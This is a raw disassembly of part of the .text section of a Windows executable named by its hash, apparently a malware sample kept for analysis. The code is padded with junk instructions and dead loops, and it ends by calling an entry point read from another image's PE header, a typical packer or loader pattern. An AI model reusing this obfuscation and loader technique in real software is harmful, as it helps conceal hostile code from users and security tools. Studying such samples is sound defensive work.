
884054aeaaf1eb01f9925d93629f7aa24e3c6f63e760e3c0a4f7ab74c2327b22.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x108
  401009:	push   esi
  40100a:	lea    eax,[ebp-0xc4]
  401010:	push   eax
  401011:	add    DWORD PTR ds:0x435000,0x438000
  40101b:	push   0xf
  40101d:	sub    DWORD PTR ds:0x43701c,0x435018
  401027:	call   DWORD PTR ds:0x43a8d8
  40102d:	xor    DWORD PTR ds:0x434020,0x437010
  401037:	push   0x43a3e4
  40103c:	inc    DWORD PTR ds:0x435010
  401042:	xor    esi,esi
  401044:	inc    esi
  401045:	mov    DWORD PTR ds:0x434000,0x5c4e
  40104f:	push   esi
  401050:	dec    DWORD PTR ds:0x43401c
  401056:	push   esi
  401057:	and    DWORD PTR ds:0x438004,0x43501c
  401061:	call   DWORD PTR ds:0x43a8ec
  401067:	xor    DWORD PTR ds:0x438000,0x435010
  401071:	test   eax,eax
  401073:	mov    DWORD PTR ds:0x436018,0x4ead
  40107d:	je     0x401094
  401083:	xor    eax,eax
  401085:	mov    DWORD PTR ds:0x435008,0x2c45
  40108f:	jmp    0x40258f
  401094:	push   ebx
  401095:	xor    DWORD PTR ds:0x435008,ecx
  40109b:	mov    ebx,DWORD PTR ds:0x43a8cc
  4010a1:	inc    DWORD PTR ds:0x434004
  4010a7:	push   0x9
  4010a9:	add    DWORD PTR ds:0x434024,0x434008
  4010b3:	push   0x43a3fc
  4010b8:	call   ebx
  4010ba:	and    DWORD PTR ds:0x43800c,0x434000
  4010c4:	test   eax,eax
  4010c6:	je     0x4010ef
  4010cc:	sbb    DWORD PTR ds:0x435010,0x438014
  4010d6:	lea    eax,[ebp-0x20]
  4010d9:	push   eax
  4010da:	or     DWORD PTR ds:0x43601c,0x436010
  4010e4:	call   DWORD PTR ds:0x43a8bc
  4010ea:	jmp    0x40258e
  4010ef:	push   edi
  4010f0:	inc    edi
  4010f1:	mov    edi,DWORD PTR ds:0x43a8fc
  4010f7:	push   0x43a418
  4010fc:	adc    DWORD PTR ds:0x43401c,0x6c9b
  401106:	push   esi
  401107:	push   esi
  401108:	or     DWORD PTR ds:0x434018,0x43401c
  401112:	call   edi
  401114:	and    DWORD PTR ds:0x436004,0x434004
  40111e:	test   eax,eax
  401120:	mov    DWORD PTR ds:0x436000,0x329d
  40112a:	jne    0x40241c
  401130:	mov    esi,DWORD PTR ds:0x43a908
  401136:	or     DWORD PTR ds:0x436000,0x434018
  401140:	push   0xd
  401142:	sbb    DWORD PTR ds:0x435000,0x435010
  40114c:	push   0x43a428
  401151:	adc    DWORD PTR ds:0x43601c,0x44f1
  40115b:	call   esi
  40115d:	test   eax,eax
  40115f:	mov    DWORD PTR ds:0x43801c,0x3c7b
  401169:	je     0x401230
  40116f:	or     DWORD PTR ds:0x434028,0x4ff1
  401179:	push   0x43a43c
  40117e:	xor    DWORD PTR ds:0x434004,0x7bc9
  401188:	push   0x1
  40118a:	push   0x1
  40118c:	sub    DWORD PTR ds:0x435014,0x4cb8
  401196:	call   DWORD PTR ds:0x43a8ec
  40119c:	adc    DWORD PTR ds:0x43600c,0x5c72
  4011a6:	test   eax,eax
  4011a8:	jne    0x402440
  4011ae:	push   0x9
  4011b0:	push   0x43a454
  4011b5:	call   ebx
  4011b7:	xor    DWORD PTR ds:0x434020,0x434004
  4011c1:	test   eax,eax
  4011c3:	mov    DWORD PTR ds:0x43501c,0x26a9
  4011cd:	jne    0x40241c
  4011d3:	add    DWORD PTR ds:0x43400c,0x437000
  4011dd:	push   0x43a470
  4011e2:	or     DWORD PTR ds:0x436004,0x437018
  4011ec:	push   0x1
  4011ee:	push   0x1
  4011f0:	call   edi
  4011f2:	xor    DWORD PTR ds:0x43501c,0xa21
  4011fc:	test   eax,eax
  4011fe:	jne    0x40241c
  401204:	and    DWORD PTR ds:0x435014,0x437004
  40120e:	push   0xd
  401210:	push   0x43a480
  401215:	sbb    DWORD PTR ds:0x436010,0x7182
  40121f:	call   esi
  401221:	mov    DWORD PTR ds:0x436004,0x55a5
  40122b:	jmp    0x402440
  401230:	mov    DWORD PTR [ebp-0x10],0x0
  401237:	add    DWORD PTR ds:0x436008,ecx
  40123d:	mov    eax,DWORD PTR [ebp-0x3c]
  401240:	mov    DWORD PTR [ebp-0x3c],eax
  401243:	mov    DWORD PTR [ebp-0x8],0xf89c8585
  40124a:	add    DWORD PTR ds:0x43700c,0x15f
  401254:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  40125b:	lea    eax,[ebp-0x44]
  40125e:	mov    edi,DWORD PTR ds:0x416574
  401264:	mov    ecx,DWORD PTR ds:0x416578
  40126a:	sub    edi,ecx
  40126c:	sub    edi,DWORD PTR [edi+ecx*1]
  40126f:	mov    DWORD PTR [ebp-0x38],eax
  401272:	xor    DWORD PTR ds:0x43500c,ecx
  401278:	lea    eax,[ebp-0x48]
  40127b:	mov    DWORD PTR [ebp-0x18],eax
  40127e:	xor    edi,edi
  401280:	add    edi,DWORD PTR ds:0x434008
  401286:	xor    DWORD PTR ds:0x435014,edi
  40128c:	mov    eax,ds:0x43a2d4
  401291:	mov    eax,DWORD PTR [eax+0x1c8]
  401297:	movzx  esi,BYTE PTR ds:0x43501c
  40129e:	or     esi,DWORD PTR ds:0x437004
  4012a4:	mov    DWORD PTR ds:0x43501c,esi
  4012aa:	mov    eax,DWORD PTR [eax]
  4012ac:	mov    ecx,DWORD PTR [ebp-0x18]
  4012af:	mov    esi,0x751089b
  4012b4:	add    DWORD PTR ds:0x438008,0x58e0
  4012be:	xor    eax,esi
  4012c0:	xor    DWORD PTR ds:0x434008,edi
  4012c6:	mov    edi,0x3272e2
  4012cb:	and    DWORD PTR ds:0x434000,0x437010
  4012d5:	add    eax,edi
  4012d7:	mov    DWORD PTR [ecx],eax
  4012d9:	mov    eax,ds:0x43a724
  4012de:	cmp    eax,0x312bc9f6
  4012e3:	jne    0x401370
  4012e9:	sbb    DWORD PTR ds:0x436010,0x463c
  4012f3:	mov    eax,DWORD PTR [ebp-0x8]
  4012f6:	mov    ecx,DWORD PTR ds:0x43a2d4
  4012fc:	inc    ebx
  4012fd:	mov    ecx,DWORD PTR [ecx+0x198]
  401303:	xor    eax,esi
  401305:	add    DWORD PTR ds:0x43701c,0x3b79
  40130f:	add    eax,edi
  401311:	mov    DWORD PTR [ecx],eax
  401313:	neg    DWORD PTR ds:0x436008
  401319:	mov    eax,DWORD PTR [ebp-0x8]
  40131c:	xor    eax,esi
  40131e:	and    DWORD PTR ds:0x437008,0x0
  401328:	jmp    0x40133a
  40132d:	mov    ebx,DWORD PTR ds:0x437008
  401333:	inc    ebx
  401334:	mov    DWORD PTR ds:0x437008,ebx
  40133a:	cmp    DWORD PTR ds:0x437008,0x12
  401341:	jae    0x401369
  401347:	cmp    DWORD PTR ds:0x437008,0x17
  40134e:	jg     0x401369
  401354:	jmp    0x401364
  401359:	push   0x426b
  40135e:	call   DWORD PTR ds:0x43a8c4
  401364:	jmp    0x40132d
  401369:	add    eax,edi
  40136b:	mov    ds:0x43a724,eax
  401370:	mov    eax,ds:0x43a2d4
  401375:	add    ebx,0x1d59
  40137b:	mov    eax,DWORD PTR [eax+0x18c]
  401381:	mov    eax,DWORD PTR [eax]
  401383:	mov    ebx,DWORD PTR ds:0x416538
  401389:	mov    ebx,DWORD PTR [ebx]
  40138b:	and    DWORD PTR ds:0x436004,ebx
  401391:	mov    DWORD PTR [ebp-0x7c],eax
  401394:	mov    eax,ds:0x416530
  401399:	mov    ebx,DWORD PTR ds:0x4165b8
  40139f:	sub    eax,ebx
  4013a1:	sub    eax,DWORD PTR [eax+ebx*1]
  4013a4:	mov    eax,0xf89c85b9
  4013a9:	mov    DWORD PTR [ebp-0x10],eax
  4013ac:	sbb    DWORD PTR ds:0x43500c,ebx
  4013b2:	mov    DWORD PTR [ebp-0x10],eax
  4013b5:	adc    DWORD PTR ds:0x436008,edx
  4013bb:	mov    DWORD PTR [ebp-0x10],eax
  4013be:	mov    DWORD PTR ds:0x434000,0x12
  4013c8:	cmp    DWORD PTR ds:0x434000,0x0
  4013cf:	je     0x401402
  4013d5:	cmp    DWORD PTR ds:0x434000,0x17
  4013dc:	jg     0x401402
  4013e2:	jmp    0x4013f0
  4013e7:	push   DWORD PTR [ebp-0x14]
  4013ea:	call   DWORD PTR ds:0x43a8c8
  4013f0:	mov    ebx,DWORD PTR ds:0x434000
  4013f6:	dec    ebx
  4013f7:	mov    DWORD PTR ds:0x434000,ebx
  4013fd:	jmp    0x4013c8
  401402:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  401409:	and    DWORD PTR ds:0x436004,0x0
  401413:	jmp    0x401425
  401418:	mov    ebx,DWORD PTR ds:0x436004
  40141e:	inc    ebx
  40141f:	mov    DWORD PTR ds:0x436004,ebx
  401425:	cmp    DWORD PTR ds:0x436004,0x15
  40142c:	jae    0x401454
  401432:	cmp    DWORD PTR ds:0x436004,0x1c
  401439:	ja     0x401454
  40143f:	jmp    0x40144f
  401444:	push   0x43a097
  401449:	call   DWORD PTR ds:0x43a8d0
  40144f:	jmp    0x401418
  401454:	mov    DWORD PTR [ebp-0x10],eax
  401457:	adc    ebx,0x4a4f
  40145d:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401464:	movzx  ebx,WORD PTR ds:0x434000
  40146b:	xor    ebx,DWORD PTR ds:0x438000
  401471:	mov    DWORD PTR ds:0x434000,ebx
  401477:	mov    ebx,DWORD PTR [ebp-0x8]
  40147a:	xor    ebx,esi
  40147c:	or     DWORD PTR ds:0x436000,0x43801c
  401486:	add    ebx,edi
  401488:	mov    DWORD PTR ds:0x434004,0x16bd
  401492:	jmp    0x401599
  401497:	adc    eax,DWORD PTR ds:0x437010
  40149d:	mov    eax,DWORD PTR [ebp-0xc]
  4014a0:	add    DWORD PTR ds:0x43600c,0x435004
  4014aa:	xor    eax,esi
  4014ac:	sub    DWORD PTR ds:0x434024,0x438008
  4014b6:	lea    eax,[eax+ebx*1+0x3272e2]
  4014bd:	or     DWORD PTR ds:0x43401c,0x36
  4014c7:	push   eax
  4014c8:	neg    DWORD PTR ds:0x43401c
  4014ce:	mov    eax,DWORD PTR [ebp-0x18]
  4014d1:	xor    eax,esi
  4014d3:	adc    DWORD PTR ds:0x437004,0x7bd1
  4014dd:	lea    eax,[ebp+eax*1+0x3272ea]
  4014e4:	or     DWORD PTR ds:0x434028,0x5a2b
  4014ee:	push   eax
  4014ef:	and    DWORD PTR ds:0x435010,0x0
  4014f9:	jmp    0x401509
  4014fe:	mov    eax,ds:0x435010
  401503:	inc    eax
  401504:	mov    ds:0x435010,eax
  401509:	cmp    DWORD PTR ds:0x435010,0x1b
  401510:	jae    0x401550
  401516:	cmp    DWORD PTR ds:0x435010,0x8
  40151d:	jl     0x401550
  401523:	jmp    0x401533
  401528:	push   0x43a111
  40152d:	call   DWORD PTR ds:0x43a8d4
  401533:	cmp    DWORD PTR ds:0x435010,0x7
  40153a:	jne    0x40154b
  401540:	mov    eax,ds:0x435010
  401545:	inc    eax
  401546:	mov    ds:0x435010,eax
  40154b:	jmp    0x4014fe
  401550:	mov    eax,ds:0x43a2d4
  401555:	sub    DWORD PTR ds:0x438000,0x71a4
  40155f:	push   DWORD PTR [eax+0x1bc]
  401565:	adc    DWORD PTR ds:0x436008,0x7f70
  40156f:	call   0x402598
  401574:	movzx  ecx,BYTE PTR ds:0x434020
  40157b:	sbb    DWORD PTR ds:0x434008,ecx
  401581:	mov    eax,DWORD PTR [ebp-0xc]
  401584:	adc    ecx,DWORD PTR ds:0x438018
  40158a:	xor    eax,esi
  40158c:	sbb    ecx,DWORD PTR ds:0x437000
  401592:	lea    ebx,[ebx+eax*1+0x3272e2]
  401599:	mov    ecx,DWORD PTR ds:0x434018
  40159f:	add    DWORD PTR ds:0x436000,ecx
  4015a5:	mov    eax,DWORD PTR [ebp-0xc]
  4015a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ab:	adc    DWORD PTR ds:0x43801c,0x43400c
  4015b5:	xor    ecx,esi
  4015b7:	xor    DWORD PTR ds:0x43800c,0x6ae7
  4015c1:	xor    eax,esi
  4015c3:	add    eax,ecx
  4015c5:	xor    ecx,0x639d
  4015cb:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ce:	sbb    DWORD PTR ds:0x437004,0x435008
  4015d8:	xor    ecx,esi
  4015da:	lea    eax,[eax+ecx*1+0x9758a6]
  4015e1:	mov    DWORD PTR ds:0x437018,0x6f5b
  4015eb:	cmp    ebx,eax
  4015ed:	jbe    0x401497
  4015f3:	mov    eax,DWORD PTR [ebp+0xc]
  4015f6:	and    DWORD PTR ds:0x43601c,ebx
  4015fc:	mov    ds:0x43a158,eax
  401601:	mov    eax,DWORD PTR [ebp+0x10]
  401604:	mov    DWORD PTR ds:0x435004,0xee9
  40160e:	mov    ds:0x43a3ac,eax
  401613:	sbb    DWORD PTR ds:0x436000,ebx
  401619:	mov    eax,ds:0x43a158
  40161e:	neg    ecx
  401620:	mov    ecx,DWORD PTR [ebp-0x38]
  401623:	sub    eax,edi
  401625:	xor    eax,esi
  401627:	mov    DWORD PTR ds:0x438010,0x5a04
  401631:	mov    DWORD PTR [ecx],eax
  401633:	mov    DWORD PTR ds:0x438010,ecx
  401639:	mov    eax,DWORD PTR [ebp-0x3c]
  40163c:	mov    DWORD PTR ds:0x43701c,0x1a94
  401646:	cmp    eax,0xf89c8585
  40164b:	mov    DWORD PTR ds:0x43501c,0x7d63
  401655:	jne    0x401b36
  40165b:	or     DWORD PTR ds:0x43400c,0x43501c
  401665:	push   0x43a494
  40166a:	xor    ebx,ebx
  40166c:	mov    DWORD PTR ds:0x43700c,0x6301
  401676:	inc    ebx
  401677:	and    DWORD PTR ds:0x437014,0x438000
  401681:	push   ebx
  401682:	push   ebx
  401683:	adc    DWORD PTR ds:0x436010,0x6629
  40168d:	call   DWORD PTR ds:0x43a8ec
  401693:	or     DWORD PTR ds:0x435008,0x107f
  40169d:	test   eax,eax
  40169f:	jne    0x402440
  4016a5:	xor    DWORD PTR ds:0x434014,0x437000
  4016af:	push   0x9
  4016b1:	push   0x43a4ac
  4016b6:	xor    DWORD PTR ds:0x43701c,0x434028
  4016c0:	call   DWORD PTR ds:0x43a8cc
  4016c6:	test   eax,eax
  4016c8:	jne    0x40241c
  4016ce:	adc    DWORD PTR ds:0x438010,0x6458
  4016d8:	push   0x43a4c8
  4016dd:	push   ebx
  4016de:	push   ebx
  4016df:	call   DWORD PTR ds:0x43a8fc
  4016e5:	test   eax,eax
  4016e7:	mov    DWORD PTR ds:0x434014,0x6a9b
  4016f1:	jne    0x40241c
  4016f7:	add    DWORD PTR ds:0x434018,0x437004
  401701:	push   0xd
  401703:	neg    DWORD PTR ds:0x438004
  401709:	push   0x43a4d8
  40170e:	and    DWORD PTR ds:0x435010,0x62ab
  401718:	call   DWORD PTR ds:0x43a908
  40171e:	or     DWORD PTR ds:0x435008,0x43600c
  401728:	test   eax,eax
  40172a:	jne    0x402440
  401730:	sbb    DWORD PTR ds:0x436010,0x438018
  40173a:	lea    eax,[ebp-0x34]
  40173d:	sub    DWORD PTR ds:0x43500c,0x6999
  401747:	mov    DWORD PTR [ebp-0x9c],eax
  40174d:	lea    eax,[ebp+0x4]
  401750:	or     DWORD PTR ds:0x43700c,0x43601c
  40175a:	mov    DWORD PTR [ebp-0x34],eax
  40175d:	xor    eax,DWORD PTR ds:0x43600c
  401763:	mov    eax,DWORD PTR [ebp-0x34]
  401766:	and    DWORD PTR ds:0x43401c,0x436018
  401770:	test   eax,eax
  401772:	je     0x402572
  401778:	xor    eax,ecx
  40177a:	mov    eax,DWORD PTR [ebp-0x28]
  40177d:	mov    eax,DWORD PTR [ebp-0xc]
  401780:	xor    DWORD PTR ds:0x434008,0x3c87
  40178a:	mov    eax,DWORD PTR [ebp-0x8]
  40178d:	and    DWORD PTR ds:0x434008,0x0
  401797:	xor    ecx,ecx
  401799:	add    ecx,DWORD PTR ds:0x434008
  40179f:	inc    ecx
  4017a0:	mov    DWORD PTR ds:0x434008,ecx
  4017a6:	cmp    DWORD PTR ds:0x434008,0x23
  4017ad:	jbe    0x4017ce
  4017b3:	jmp    0x4017c1
  4017b8:	push   DWORD PTR [ebp-0x20]
  4017bb:	call   DWORD PTR ds:0x43a8dc
  4017c1:	cmp    DWORD PTR ds:0x434008,0x15
  4017c8:	jb     0x401797
  4017ce:	mov    DWORD PTR [ebp+0xc],eax
  4017d1:	mov    DWORD PTR ds:0x43400c,0x1d
  4017db:	cmp    DWORD PTR ds:0x43400c,0x0
  4017e2:	je     0x40183c
  4017e8:	cmp    DWORD PTR ds:0x43400c,0x3
  4017ef:	ja     0x40183c
  4017f5:	jmp    0x40180e
  4017fa:	push   0x43a0c9
  4017ff:	push   DWORD PTR [ebp-0x18]
  401802:	push   DWORD PTR [ebp-0x28]
  401805:	push   DWORD PTR [ebp-0x1c]
  401808:	call   DWORD PTR ds:0x43a8e0
  40180e:	cmp    DWORD PTR ds:0x43400c,0x4
  401815:	jne    0x40182a
  40181b:	xor    ecx,ecx
  40181d:	add    ecx,DWORD PTR ds:0x43400c
  401823:	dec    ecx
  401824:	mov    DWORD PTR ds:0x43400c,ecx
  40182a:	mov    ecx,DWORD PTR ds:0x43400c
  401830:	dec    ecx
  401831:	mov    DWORD PTR ds:0x43400c,ecx
  401837:	jmp    0x4017db
  40183c:	mov    eax,eax
  40183e:	and    DWORD PTR ds:0x43401c,0x0
  401848:	jmp    0x40185c
  40184d:	xor    ecx,ecx
  40184f:	add    ecx,DWORD PTR ds:0x43401c
  401855:	inc    ecx
  401856:	mov    DWORD PTR ds:0x43401c,ecx
  40185c:	cmp    DWORD PTR ds:0x43401c,0x14
  401863:	jae    0x4018b6
  401869:	cmp    DWORD PTR ds:0x43401c,0x9
  401870:	jge    0x4018b6
  401876:	jmp    0x401897
  40187b:	push   DWORD PTR [ebp-0x14]
  40187e:	push   0x434004
  401883:	push   DWORD PTR [ebp-0x24]
  401886:	push   0x43a07b
  40188b:	push   DWORD PTR [ebp-0x20]
  40188e:	push   DWORD PTR [ebp-0x18]
  401891:	call   DWORD PTR ds:0x43a8e4
  401897:	cmp    DWORD PTR ds:0x43401c,0x8
  40189e:	jne    0x4018b1
  4018a4:	mov    ecx,DWORD PTR ds:0x43401c
  4018aa:	inc    ecx
  4018ab:	mov    DWORD PTR ds:0x43401c,ecx
  4018b1:	jmp    0x40184d
  4018b6:	mov    eax,ds:0x43a2d4
  4018bb:	or     DWORD PTR ds:0x434008,0x6b78
  4018c5:	mov    eax,DWORD PTR [eax+0x1c8]
  4018cb:	mov    eax,DWORD PTR [eax]
  4018cd:	mov    DWORD PTR ds:0x43400c,0x1f
  4018d7:	cmp    DWORD PTR ds:0x43400c,0x0
  4018de:	je     0x40191e
  4018e4:	cmp    DWORD PTR ds:0x43400c,0x21
  4018eb:	jbe    0x40191e
  4018f1:	jmp    0x40190a
  4018f6:	push   0x1259
  4018fb:	push   DWORD PTR [ebp-0x10]
  4018fe:	push   DWORD PTR [ebp-0x28]
  401901:	push   DWORD PTR [ebp-0xc]
  401904:	call   DWORD PTR ds:0x43a8e8
  40190a:	xor    ecx,ecx
  40190c:	xor    ecx,DWORD PTR ds:0x43400c
  401912:	dec    ecx
  401913:	mov    DWORD PTR ds:0x43400c,ecx
  401919:	jmp    0x4018d7
  40191e:	cdq    
  40191f:	mov    ebx,eax
  401921:	mov    DWORD PTR ds:0x435000,0x1d
  40192b:	cmp    DWORD PTR ds:0x435000,0x0
  401932:	je     0x401964
  401938:	cmp    DWORD PTR ds:0x435000,0x28
  40193f:	ja     0x401964
  401945:	jmp    0x401950
  40194a:	call   DWORD PTR ds:0x43a8f0
  401950:	xor    ecx,ecx
  401952:	add    ecx,DWORD PTR ds:0x435000
  401958:	dec    ecx
  401959:	mov    DWORD PTR ds:0x435000,ecx
  40195f:	jmp    0x40192b
  401964:	mov    eax,0xfabdbee7
  401969:	add    ebx,eax
  40196b:	mov    DWORD PTR ds:0x43501c,ebx
  401971:	adc    edx,0xffffffff
  401974:	and    ecx,DWORD PTR ds:0x434018
  40197a:	and    DWORD PTR [ebp-0x10],0x0
  40197e:	xor    edx,0x0
  401981:	mov    DWORD PTR [ebp-0x6c],edx
  401984:	mov    edx,DWORD PTR [ebp+0xc]
  401987:	mov    DWORD PTR [ebp-0x14],edx
  40198a:	and    ecx,edx
  40198c:	mov    ecx,0x8a29a12d
  401991:	and    DWORD PTR ds:0x437018,0x6956
  40199b:	xor    ebx,ecx
  40199d:	add    DWORD PTR [ebp-0x14],eax
  4019a0:	mov    edx,DWORD PTR [ebp-0x14]
  4019a3:	mov    DWORD PTR ds:0x437018,0xe51
  4019ad:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4019b1:	adc    DWORD PTR ds:0x43401c,0x434014
  4019bb:	xor    edx,ecx
  4019bd:	sub    DWORD PTR ds:0x438018,0x437000
  4019c7:	mov    DWORD PTR [ebp-0x5c],edx
  4019ca:	mov    edx,DWORD PTR [ebp-0x10]
  4019cd:	xor    edx,0x0
  4019d0:	mov    DWORD PTR [ebp-0x58],edx
  4019d3:	mov    DWORD PTR ds:0x43600c,0x7e33
  4019dd:	cmp    DWORD PTR [ebp-0x5c],ebx
  4019e0:	mov    DWORD PTR ds:0x434010,0x71c9
  4019ea:	jne    0x401a0c
  4019f0:	mov    edx,DWORD PTR ds:0x434004
  4019f6:	mov    edx,DWORD PTR [ebp-0x6c]
  4019f9:	cmp    DWORD PTR [ebp-0x58],edx
  4019fc:	mov    DWORD PTR ds:0x43600c,0x7cc1
  401a06:	je     0x401aa7
  401a0c:	mov    DWORD PTR ds:0x434018,0x1c
  401a16:	cmp    DWORD PTR ds:0x434018,0x0
  401a1d:	je     0x401a50
  401a23:	cmp    DWORD PTR ds:0x434018,0x29
  401a2a:	jbe    0x401a50
  401a30:	jmp    0x401a3e
  401a35:	push   DWORD PTR [ebp-0x28]
  401a38:	call   DWORD PTR ds:0x43a8f4
  401a3e:	mov    edx,DWORD PTR ds:0x434018
  401a44:	dec    edx
  401a45:	mov    DWORD PTR ds:0x434018,edx
  401a4b:	jmp    0x401a16
  401a50:	mov    edx,DWORD PTR ds:0x43a2d4
  401a56:	or     DWORD PTR ds:0x436018,0x438010
  401a60:	mov    edx,DWORD PTR [edx+0x1c0]
  401a66:	add    DWORD PTR ds:0x434018,0x436004
  401a70:	mov    edx,DWORD PTR [edx]
  401a72:	xor    ebx,ebx
  401a74:	add    edx,eax
  401a76:	adc    ebx,0xffffffff
  401a79:	xor    edx,ecx
  401a7b:	xor    ebx,0x0
  401a7e:	cmp    edx,0x70941fc5
  401a84:	mov    DWORD PTR ds:0x438014,0x6222
  401a8e:	jne    0x402572
  401a94:	cmp    ebx,0xffffffff
  401a97:	mov    DWORD PTR ds:0x436010,0x168c
  401aa1:	jne    0x402572
  401aa7:	mov    edx,DWORD PTR ds:0x43a350
  401aad:	or     DWORD PTR ds:0x43501c,0x338f
  401ab7:	mov    ebx,DWORD PTR ds:0x43a358
  401abd:	sbb    DWORD PTR ds:0x43501c,0x434008
  401ac7:	xor    edx,ebx
  401ac9:	and    DWORD PTR ds:0x438000,0x0
  401ad3:	jmp    0x401ae5
  401ad8:	mov    ebx,DWORD PTR ds:0x438000
  401ade:	inc    ebx
  401adf:	mov    DWORD PTR ds:0x438000,ebx
  401ae5:	cmp    DWORD PTR ds:0x438000,0x1a
  401aec:	jae    0x401b17
  401af2:	cmp    DWORD PTR ds:0x438000,0x29
  401af9:	jl     0x401b17
  401aff:	jmp    0x401b12
  401b04:	push   0x4320
  401b09:	push   DWORD PTR [ebp-0x28]
  401b0c:	call   DWORD PTR ds:0x43a8f8
  401b12:	jmp    0x401ad8
  401b17:	mov    DWORD PTR ds:0x43a350,edx
  401b1d:	mov    edx,DWORD PTR [ebp-0x34]
  401b20:	mov    ebx,DWORD PTR ds:0x43a350
  401b26:	add    ebx,DWORD PTR [edx]
  401b28:	not    DWORD PTR ds:0x43801c
  401b2e:	mov    edx,DWORD PTR [ebp-0x34]
  401b31:	jmp    0x402531
  401b36:	mov    eax,DWORD PTR [ebp-0x44]
  401b39:	mov    DWORD PTR ds:0x436000,0x3783
  401b43:	cmp    eax,0xf89c8584
  401b48:	mov    DWORD PTR ds:0x434000,0x66dd
  401b52:	je     0x401d61
  401b58:	xor    eax,eax
  401b5a:	xor    eax,DWORD PTR ds:0x434018
  401b60:	adc    eax,DWORD PTR ds:0x434024
  401b66:	mov    ds:0x434018,eax
  401b6b:	mov    eax,DWORD PTR [ebp-0x8]
  401b6e:	mov    ecx,DWORD PTR [ebp-0x48]
  401b71:	xor    eax,esi
  401b73:	add    eax,edi
  401b75:	mov    DWORD PTR ds:0x436004,0x39e8
  401b7f:	cmp    eax,ecx
  401b81:	mov    DWORD PTR ds:0x434018,0x5d7a
  401b8b:	je     0x401d61
  401b91:	xor    DWORD PTR ds:0x434000,0x3742
  401b9b:	push   0x43a5f4
  401ba0:	xor    esi,esi
  401ba2:	inc    esi
  401ba3:	sbb    DWORD PTR ds:0x43801c,0x434008
  401bad:	push   esi
  401bae:	sub    DWORD PTR ds:0x43701c,0x437018
  401bb8:	push   esi
  401bb9:	adc    DWORD PTR ds:0x436004,0x30fb
  401bc3:	call   DWORD PTR ds:0x43a8ec
  401bc9:	or     DWORD PTR ds:0x435000,0x43400c
  401bd3:	test   eax,eax
  401bd5:	mov    DWORD PTR ds:0x437010,0x752e
  401bdf:	jne    0x402440
  401be5:	mov    DWORD PTR ds:0x43501c,0xd2c
  401bef:	push   0x9
  401bf1:	add    DWORD PTR ds:0x43500c,0x3ba4
  401bfb:	push   0x43a60c
  401c00:	call   DWORD PTR ds:0x43a8cc
  401c06:	test   eax,eax
  401c08:	jne    0x40241c
  401c0e:	and    DWORD PTR ds:0x43401c,0x438010
  401c18:	push   0x43a628
  401c1d:	push   esi
  401c1e:	push   esi
  401c1f:	sbb    DWORD PTR ds:0x436000,0x437014
  401c29:	call   DWORD PTR ds:0x43a8fc
  401c2f:	or     DWORD PTR ds:0x43400c,0x434020
  401c39:	test   eax,eax
  401c3b:	mov    DWORD PTR ds:0x438018,0x4ca0
  401c45:	jne    0x40241c
  401c4b:	push   0xd
  401c4d:	add    DWORD PTR ds:0x437000,0x43400c
  401c57:	push   0x43a638
  401c5c:	call   DWORD PTR ds:0x43a908
  401c62:	add    DWORD PTR ds:0x437018,0x7176
  401c6c:	test   eax,eax
  401c6e:	jne    0x402440
  401c74:	mov    DWORD PTR ds:0x436000,0x1e
  401c7e:	cmp    DWORD PTR ds:0x436000,0x0
  401c85:	je     0x401cd4
  401c8b:	cmp    DWORD PTR ds:0x436000,0x10
  401c92:	jle    0x401cd4
  401c98:	jmp    0x401ca8
  401c9d:	push   0x435014
  401ca2:	call   DWORD PTR ds:0x43a900
  401ca8:	cmp    DWORD PTR ds:0x436000,0x11
  401caf:	jne    0x401cc2
  401cb5:	mov    ecx,DWORD PTR ds:0x436000
  401cbb:	dec    ecx
  401cbc:	mov    DWORD PTR ds:0x436000,ecx
  401cc2:	mov    ecx,DWORD PTR ds:0x436000
  401cc8:	dec    ecx
  401cc9:	mov    DWORD PTR ds:0x436000,ecx
  401ccf:	jmp    0x401c7e
  401cd4:	mov    eax,ds:0x43a2d4
  401cd9:	mov    ecx,DWORD PTR ds:0x435004
  401cdf:	or     DWORD PTR ds:0x438010,ecx
  401ce5:	mov    eax,DWORD PTR [eax+0x194]
  401ceb:	mov    ecx,DWORD PTR [eax]
  401ced:	mov    eax,DWORD PTR [ecx+0x3c]
  401cf0:	push   DWORD PTR ds:0x43a3ac
  401cf6:	mov    DWORD PTR ds:0x435014,0x6873
  401d00:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401d04:	push   DWORD PTR ds:0x43a158
  401d0a:	mov    DWORD PTR ds:0x43400c,0x7a94
  401d14:	add    eax,ecx
  401d16:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d1c:	or     DWORD PTR ds:0x437010,0x5a23
  401d26:	mov    ecx,DWORD PTR [ecx+0x194]
  401d2c:	mov    DWORD PTR ds:0x436008,0x65e8
  401d36:	push   DWORD PTR [ecx]
  401d38:	sbb    DWORD PTR ds:0x43401c,0x5228
  401d42:	call   eax
  401d44:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d4a:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d50:	mov    DWORD PTR ds:0x437014,0xc7a
  401d5a:	mov    DWORD PTR [ecx],eax
  401d5c:	jmp    0x402572
  401d61:	adc    DWORD PTR ds:0x43700c,0x4142
  401d6b:	push   0x43a4ec
  401d70:	adc    DWORD PTR ds:0x435008,0x3813
  401d7a:	xor    ebx,ebx
  401d7c:	sbb    DWORD PTR ds:0x43801c,0x3514
  401d86:	inc    ebx
  401d87:	not    DWORD PTR ds:0x435008
  401d8d:	push   ebx
  401d8e:	push   ebx
  401d8f:	call   DWORD PTR ds:0x43a8ec
  401d95:	or     DWORD PTR ds:0x436010,0x434018
  401d9f:	test   eax,eax
  401da1:	mov    DWORD PTR ds:0x437008,0x71b6
  401dab:	jne    0x402440
  401db1:	or     DWORD PTR ds:0x438010,0x434014
  401dbb:	push   0x9
  401dbd:	add    DWORD PTR ds:0x437008,0x6ead
  401dc7:	push   0x43a504
  401dcc:	add    DWORD PTR ds:0x437010,0x12d1
  401dd6:	call   DWORD PTR ds:0x43a8cc
  401ddc:	add    DWORD PTR ds:0x434014,0x5154
  401de6:	test   eax,eax
  401de8:	mov    DWORD PTR ds:0x43600c,0xb65
  401df2:	jne    0x40241c
